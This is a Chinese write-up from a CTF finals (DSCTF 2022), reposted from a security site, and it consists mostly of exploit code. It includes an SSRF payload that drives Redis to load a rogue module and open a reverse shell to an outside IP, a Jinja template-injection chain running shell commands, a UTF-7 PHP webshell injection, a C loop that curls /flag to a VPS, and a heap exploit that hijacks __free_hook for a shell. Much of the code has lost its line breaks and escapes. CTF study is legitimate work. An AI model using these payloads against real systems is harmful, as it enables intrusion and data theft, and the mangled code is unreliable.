# 2022 DSCTF决赛wp

> 原文: https://www.ctfiot.com/51953.html
> ID: 51953

点击蓝字 ·  关注我们

01

Web

1

ezjava

扫⽬录 /actuator/heapdump 找到redis密码

注册个⽤户 登录 有jwt就可以过过滤器 然后就可以ssrf了 客户端是jodd-http

https://github.com/oblac/jodd-http/issues/9

import urllib.parseurl = '''http://127.0.0.1:
6379/ HTTP/1.1rnHost: 127.0.0.1:
6379rnAUTHenw!BKT_hac*pev9nvjrnSLAVEOF 121.4.124.62 6666rnCONFIG SET dir /tmprnconfig setdbfilename exp.sornMODULE LOAD /tmp/exp.sornsystem.rev 121.4.124.62 9001rnSLAVEOFNO ONErnquitrnPOST / '''print(urllib.parse.quote(url))

2

newweb_new

nghttp http://39.106.156.96:
48097/ -v

POST /sup3rh1dep4th/?x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat%20/f*').read() HTTP/2Host: 39.106.156.96:
48097Content-Length: 241Content-Type: application/x-www-form-urlencodeddata=()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(280)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)

3

safe_script_new

POST / HTTP/1.1Host: 39.107.68.209:
36319User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
103.0) Gecko/20100101Firefox/103.0Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: sessid=php://filter/convert.iconv.utf-7.utf-8/resource=/var/www/html/1.phpUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 105key=%2BADw%3Fphp%20%2BAEA%2Deval%28%2BACQAXw%2DPOST%2BAFs%2D1%2BAF0%29%2BADs%20%20%3F%2BAD4APQ&value=aaaa

import subprocessimport reimport osimport time
def get_version(program):
pid = program[1]try:
exe_path = "/proc/" + pid + "/exe"program_path = subprocess.check_output(["su","-l",program[0],"-s",'/bin/bash','-c',f"readlink {exe_path}"], timeout=1).decode('utf-8').strip()print(program, "/proc/" + pid + "/exe", program_path)return subprocess.check_output([program_path, '--version'],timeout=1).decode('utf-8').strip()
except Exception as e:
print(e)return None
def get_process_list():
try:
process_list = []raw = subprocess.check_output(['ps', '-ef']).decode('utf-8').strip() # raw = open("a.txt", "r").read()lines = raw.split('n')for line in lines:if line.startswith('UID'):
continuedata = re.findall(r'^([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+(.+?)$', line)if len(data) > 0:
data = data[0]else:
continueprint(data, data[-1])if "java" in data[-1]:
process_list.append(data)return process_list
except subprocess.CalledProcessError:
return Noneif __name__ == '__main__':
while True:
try:
processes = get_process_list()for process in processes:
get_version(process)
except:
passtime.sleep(20)

#include <stdlib.h>int main(int argc, char* argv[]) {for(int i = 0; i < 1000; i++){system("curl http://<vps_ip>:
4040/?flag=`cat /flag`");system("sleep 3"); }}

02

Misc

1

Esc@pE_ASt_Reverge_d

03

Crypto

1

tomic

from sage.all import *from pwn import *context.log_level='debug'r=remote('39.106.156.96',36510)r.recvuntil('Factor ')n=int(r.recvline().strip()[:-1])factors=qsieve(n)[0]p,q=[int(i) for i in factors]r.sendline(str(p+q))r.recvuntil(' - ')n=int(r.recvuntil(' - ')[:-3])e=int(r.recvuntil(':')[:-1])p=GCD(n,e)q=n//pr.sendline(str(p+q))r.interactive()

04

Pwn

1

gonote_new

#coding:
utf-8import sys
from pwn import *context.log_level='debug'#context.arch='amd64'while True : # try : if len(sys.argv)==1 : io=process('./gonote') # io=process(['./'],env={'LD_PRELOAD':'./'}) elf=ELF('./gonote') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret one_gadget = [0x4f2c5,0x4f322,0x10a38c] else : io=remote('39.107.82.169',9110) elf=ELF('./gonote') libc=ELF('./libc-2.27.so') pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret one_gadget = [0x4f2c5,0x4f322,0x10a38c] def add(a,b,c): io.sendlineafter('Your choice: ','1') io.sendlineafter('Index: ',str(a)) io.sendlineafter('Size: ',str(b)) io.sendafter('Content: ',c) def show(a): io.sendlineafter('Your choice: ','2') io.sendlineafter('Index: ',str(a)) def delete(a): io.sendlineafter('Your choice: ','3')io.sendlineafter('Index: ',str(a)) add(2,-0xff88,'a') add(0,0x1f8,'a'*0xf7+'n') add(1,0x1f8,'a'*0xf7+'n') add(3,0x1f8,'a'*0xf7+'n') add(4,0xf8,'/bin/shx00') add(5,0x1f8,'a'*0xf7+'n') delete(2) add(2,-0xff88,'x00'*0x70+p64(0)+p64(0x601)) delete(0) add(0,0x1f8,'a'*0xf7+'n') show(1) libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-96-0x10 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] delete(5) delete(3) add(3,0xf8,'a'*0xf7+'n') add(5,0x188,'a'*0xf8+p64(0x1f8)+p64(libc.sym['__free_hook'])) add(6,0x1f8,'a'*0xf7+'n') add(7,0x1f8,p64(system_addr)) delete(4) # success('libc_base:'+hex(libc_base)) # gdb.attach(io) # pause() io.interactive() # 
except Exception as e: # io.close() # continue # else: # continue

Tip

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）

你的加入可以给我们带来新的活力，我们同样也可以赠你无限的发展空间。

有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括自己的学习方向，学习经历等）

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
https://github.com/oblac/jodd-http/issues/9
import urllib.parseurl = '''http://127.0.0.1:
6379/ HTTP/1.1rnHost: 127.0.0.1:
6379rnAUTHenw!BKT_hac*pev9nvjrnSLAVEOF 121.4.124.62 6666rnCONFIG SET dir /tmprnconfig setdbfilename exp.sornMODULE LOAD /tmp/exp.sornsystem.rev 121.4.124.62 9001rnSLAVEOFNO ONErnquitrnPOST / '''print(urllib.parse.quote(url))
nghttp http://39.106.156.96:
48097/ -v
POST /sup3rh1dep4th/?x1=__class__&x2=__base__&x3=__subclasses__&x4=__getitem__&x5=__init__&x6=__globals__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat%20/f*').read() HTTP/2Host: 39.106.156.96:
48097Content-Length: 241Content-Type: application/x-www-form-urlencodeddata=()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(280)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)
POST / HTTP/1.1Host: 39.107.68.209:
36319User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
103.0) Gecko/20100101Firefox/103.0Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: sessid=php://filter/convert.iconv.utf-7.utf-8/resource=/var/www/html/1.phpUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 105key=%2BADw%3Fphp%20%2BAEA%2Deval%28%2BACQAXw%2DPOST%2BAFs%2D1%2BAF0%29%2BADs%20%20%3F%2BAD4APQ&value=aaaa
import subprocessimport reimport osimport time
def get_version(program):
pid = program[1]try:
exe_path = "/proc/" + pid + "/exe"program_path = subprocess.check_output(["su","-l",program[0],"-s",'/bin/bash','-c',f"readlink {exe_path}"], timeout=1).decode('utf-8').strip()print(program, "/proc/" + pid + "/exe", program_path)return subprocess.check_output([program_path, '--version'],timeout=1).decode('utf-8').strip()
except Exception as e:
print(e)return None
def get_process_list():
try:
process_list = []raw = subprocess.check_output(['ps', '-ef']).decode('utf-8').strip() # raw = open("a.txt", "r").read()lines = raw.split('n')for line in lines:if line.startswith('UID'):
continuedata = re.findall(r'^([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+([^x20]+)x20+(.+?)$', line)if len(data) > 0:
data = data[0]else:
continueprint(data, data[-1])if "java" in data[-1]:
process_list.append(data)return process_list
except subprocess.CalledProcessError:
return Noneif __name__ == '__main__':
while True:
try:
processes = get_process_list()for process in processes:
get_version(process)
except:
passtime.sleep(20)
    #include <stdlib.h>int main(int argc, char* argv[]) {for(int i = 0; i < 1000; i++){system("curl http://<vps_ip>:
4040/?flag=`cat /flag`");system("sleep 3"); }}
from sage.all import *from pwn import *context.log_level='debug'r=remote('39.106.156.96',36510)r.recvuntil('Factor ')n=int(r.recvline().strip()[:-1])factors=qsieve(n)[0]p,q=[int(i) for i in factors]r.sendline(str(p+q))r.recvuntil(' - ')n=int(r.recvuntil(' - ')[:-3])e=int(r.recvuntil(':')[:-1])p=GCD(n,e)q=n//pr.sendline(str(p+q))r.interactive()
    #coding:
utf-8import sys
from pwn import *context.log_level='debug'#context.arch='amd64'while True : # try : if len(sys.argv)==1 : io=process('./gonote') # io=process(['./'],env={'LD_PRELOAD':'./'}) elf=ELF('./gonote') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so') pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret one_gadget = [0x4f2c5,0x4f322,0x10a38c] else : io=remote('39.107.82.169',9110) elf=ELF('./gonote') libc=ELF('./libc-2.27.so') pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret one_gadget = [0x4f2c5,0x4f322,0x10a38c] def add(a,b,c): io.sendlineafter('Your choice: ','1') io.sendlineafter('Index: ',str(a)) io.sendlineafter('Size: ',str(b)) io.sendafter('Content: ',c) def show(a): io.sendlineafter('Your choice: ','2') io.sendlineafter('Index: ',str(a)) def delete(a): io.sendlineafter('Your choice: ','3')io.sendlineafter('Index: ',str(a)) add(2,-0xff88,'a') add(0,0x1f8,'a'*0xf7+'n') add(1,0x1f8,'a'*0xf7+'n') add(3,0x1f8,'a'*0xf7+'n') add(4,0xf8,'/bin/shx00') add(5,0x1f8,'a'*0xf7+'n') delete(2) add(2,-0xff88,'x00'*0x70+p64(0)+p64(0x601)) delete(0) add(0,0x1f8,'a'*0xf7+'n') show(1) libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-96-0x10 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] delete(5) delete(3) add(3,0xf8,'a'*0xf7+'n') add(5,0x188,'a'*0xf8+p64(0x1f8)+p64(libc.sym['__free_hook'])) add(6,0x1f8,'a'*0xf7+'n') add(7,0x1f8,p64(system_addr)) delete(4) # success('libc_base:'+hex(libc_base)) # gdb.attach(io) # pause() io.interactive() # 
except Exception as e: # io.close() # continue # else: # continue
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/6-1659575899.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/6-1659575900.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/10-1659575900.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/4-1659575901.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/3-1659575902.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/10-1659575902.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/2-1659575902.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/6-1659575903.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/7-1659575903.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/08/1-1659575903.png)